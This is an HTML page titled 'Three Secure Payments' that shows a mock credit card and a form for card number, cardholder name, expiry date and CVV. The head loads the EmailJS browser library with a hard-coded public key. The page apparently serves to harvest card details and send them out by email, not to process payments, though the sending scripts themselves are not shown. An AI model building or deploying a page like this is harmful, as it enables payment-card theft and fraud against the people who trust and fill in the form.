<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Three Secure Payments</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            emailjs.init("i1ODMvIEWNe1GUjA9"); // Your EmailJS public key
        })();
    </script>

</head>
<body>
    <div class="container d-flex align-items-center justify-content-center min-vh-100 bg-gradient">
        <div class="card-form-wrapper">
            <div class="credit-card mb-4">
                <div class="chip"></div>
                <div class="card-details">
                    <div class="card-number" id="displayCardNumber">1234 5678 9012 3456</div>
                    <div class="card-name" id="displayCardName">John Doe</div>
                    <div class="card-expiry" id="displayExpiryDate">MM/YY</div>
                </div>
            </div>
            <h1 class="text-center text-white mb-4">Enter Card Details</h1>
            <form id="cardForm" class="needs-validation" novalidate>
                <div class="mb-3 position-relative">
                    <label for="cardNumber" class="form-label text-white">Card Number</label>
                    <input type="text" class="form-control" id="cardNumber" name="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required>
                    <div id="cardNumberError" class="invalid-feedback" style="display: none;">The card number is not valid.</div>
                </div>
                <div class="mb-3">
                    <label for="cardName" class="form-label text-white">Cardholder Name</label>
                    <input type="text" class="form-control" id="cardName" name="cardName" placeholder="John Doe" required>
                    <div class="invalid-feedback">Cardholder name is required.</div>
                </div>
                <div class="form-row d-flex gap-3">
                    <div class="form-group w-48">
                        <label for="expiryDate">Expiry Date</label>
                        <input type="text" class="form-control" id="expiryDate" placeholder="MM/YY" required />
                        <div class="invalid-feedback" id="expiryDateError" style="display: none;">Please enter a valid expiry date.</div>
                    </div>
            
                    <div class="form-group w-48">
                        <label for="cvv">CVV</label>
                        <input type="text" class="form-control" id="cvv" maxlength="3" placeholder="CVV" required />
                        <div class="invalid-feedback" id="cvvError" style="display: none;">Please enter a valid CVV.</div>
                    </div>
                </div>
                <button type="submit" class="submit-btn">Submit</button>
            </form>
        </div>
    </div>
    <!-- Bootstrap JS Bundle -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="script.js"></script>
    <script src="emailjs.js"></script>
</body>
</html>
